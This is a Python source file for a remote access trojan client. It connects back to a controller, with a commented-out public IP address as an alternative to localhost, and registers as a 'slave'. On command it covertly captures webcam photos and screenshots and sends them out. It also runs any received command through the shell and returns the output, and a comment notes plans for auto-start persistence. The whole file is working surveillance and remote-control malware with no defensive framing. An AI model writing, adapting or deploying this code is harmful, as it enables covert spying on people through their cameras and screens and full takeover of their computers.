import socket
import struct
import subprocess
import os
import pyautogui
import cv2
from io import BytesIO

#copy to startup (auto start with computer)


bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#bridge.connect(('45.80.148.246',9999))
bridge.connect(('localhost',9999))
bridge.send(b"slave")


def capture_photo():
    # Open the camera
    camera = cv2.VideoCapture(0)  # 0 indicates the default camera device
    
    # Check if the camera is opened successfully
    if not camera.isOpened():
        raise Exception("Unable to open the camera.")
    
    # Capture a photo
    ret, frame = camera.read()
    
    # Release the camera
    camera.release()
    
    # Check if the photo capture was successful
    if not ret:
        raise Exception("Failed to capture photo.")
    
    # Convert the photo to bytes
    _, img_bytes = cv2.imencode('.jpg', frame)
    
    # Return the photo bytes
    return img_bytes.tobytes()


def capture_screenshot():
    # Use pyautogui to capture the screen
    screenshot = pyautogui.screenshot()
    
    # Create a BytesIO object to hold the image data in memory
    screenshot_bytes = BytesIO()
    
    # Save the screenshot to the BytesIO object in PNG format
    screenshot.save(screenshot_bytes, format='PNG')
    
    # Get the screenshot bytes
    screenshot_bytes = screenshot_bytes.getvalue()
    
    # Return the screenshot bytes
    return screenshot_bytes


def execute_command(command):
    current_dir = os.getcwd()

    if len(command) == 2 and command[1] == ":" and command[0].isalpha():
        # Handle drive letter change (e.g., 'e:', 'f:', 'c:')
        try:
            os.chdir(command)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change drive: {str(e)}"

    if command.lower().startswith("cd "):
        # Handle 'cd' command separately to update the current directory
        try:
            path = command[3:]  # Extract the path from the 'cd' command
            os.chdir(path)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change directory: {str(e)}"

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True, cwd=current_dir)
        return output
    except subprocess.CalledProcessError as e:
        error_message = f"Command failed with return code {e.returncode}."
        if e.output:
            error_message += "\n" + e.output
        return error_message
    except Exception as e:
        return f"An error occurred: {str(e)}"


while True:

    size = bridge.recv(1024)
    command = bridge.recv(int(size.decode()))
    unpackedresponse = struct.unpack(f"{round(int(size.decode())/struct.calcsize('s'))}s",command)

    if unpackedresponse[0].decode() == "screenshot":
        data = capture_screenshot()
        data_size = len(data)
        bridge.send(f"{data_size}".encode())
        chunk = 1024
        offset = 0
        done = False
        while not done:
            bridge.send(data[offset:offset+chunk])
            if offset+chunk > data_size:
                done = True
            offset += chunk

    elif unpackedresponse[0].decode() == "camera capture":
        data = capture_photo()
        data_size = len(data)
        bridge.send(f"{data_size}".encode())
        chunk = 1024
        offset = 0
        done = False
        while not done:
            bridge.send(data[offset:offset+chunk])
            if offset+chunk > data_size:
                done = True
            offset += chunk

    else:
        response = execute_command(unpackedresponse[0].decode())
        bytestream = struct.pack(f"{len(response)}s",response.encode())
        bridge.send(str(struct.calcsize("s")*len(response)).encode())
        bridge.send(bytestream)


